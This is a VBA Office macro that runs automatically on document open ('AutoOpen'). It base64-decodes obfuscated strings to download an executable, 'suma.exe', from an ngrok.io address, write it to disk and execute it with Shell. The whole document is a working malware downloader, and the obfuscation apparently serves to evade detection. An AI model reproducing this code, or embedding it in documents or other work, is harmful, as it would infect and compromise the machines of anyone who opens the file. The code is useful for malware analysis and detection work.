Sub AutoOpen()
Dim str1 As String, str2 As String, str3 As String, str4 As String, str5 As String
str1 = "TWljcm9zb2Z0LlhNTEhUVFA="
str2 = "QWRvZGIuU3RyZWFt"
str3 = "R0VU"
str4 = "aHR0cDovL2U0OTZhY2NlYTgwNi5uZ3Jvay5pby9leGFtcGxlL3N1bWEuZXhl"
str5 = "c3VtYS5leGU="

Dim xHttp: Set xHttp = CreateObject(olmnasjek(str1))
Dim bStrm: Set bStrm = CreateObject(olmnasjek(str2))
xHttp.Open olmnasjek(str3), olmnasjek(str4), False
xHttp.Send

With bStrm
    .Type = 1 '//binary
    .Open
    .write xHttp.responseBody
    .savetofile olmnasjek(str5), 2 '//overwrite
End With

Shell (olmnasjek(str5))
End Sub

Function olmnasjek(b64$)

    With CreateObject("Microsoft.XMLDOM").createElement("b64")
        .DataType = "bin.base64": .Text = b64
        b = .nodeTypedValue
        With CreateObject("ADODB.Stream")
            .Open: .Type = 1: .Write b: .Position = 0: .Type = 2: .Charset = "utf-8"
            olmnasjek = .ReadText
            .Close
        End With
    End With
End Function